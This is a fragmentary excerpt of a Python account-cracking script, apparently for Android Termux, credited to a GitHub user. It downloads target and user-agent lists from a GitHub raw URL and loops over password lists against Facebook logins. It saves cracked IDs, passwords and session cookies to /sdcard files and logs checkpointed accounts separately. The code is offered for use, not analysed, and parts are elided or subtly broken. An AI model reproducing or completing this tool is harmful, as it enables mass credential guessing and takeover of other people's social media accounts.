...
Orignal code of RM
Github : Julfikar404
Give credit to  RAYIM if you dont want to give credit
...
print('[•] Follow  MY FB Acount  ')
os.system('xdg-open https://www.facebook.com/profile.php?id=100089761913527')

try:
	prox= requests.get('https://raw.githubusercontent.com/Julfikar404/PRANTO/main/PRANTO.txt').text
	open('PRANTO.txt','w').write(proxies)
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Julfikar404/PRANTO/main/PRANTO.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Julfikar404/PRANTO/main/PRANTO.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/PRANTO-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/pRANTOOK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [PRANTO-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/PARNTO.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [PRANTO] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
